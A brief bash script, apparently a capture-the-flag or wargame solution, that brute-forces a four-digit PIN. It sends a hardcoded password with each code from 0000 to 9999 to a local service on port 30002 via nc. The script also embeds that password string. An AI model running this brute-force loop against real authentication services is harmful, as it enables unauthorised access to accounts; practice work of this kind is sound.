#!/bin/bash

mdp="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

for code in {0000..9999}; do
    echo "$mdp $code"
done | nc localhost 30002
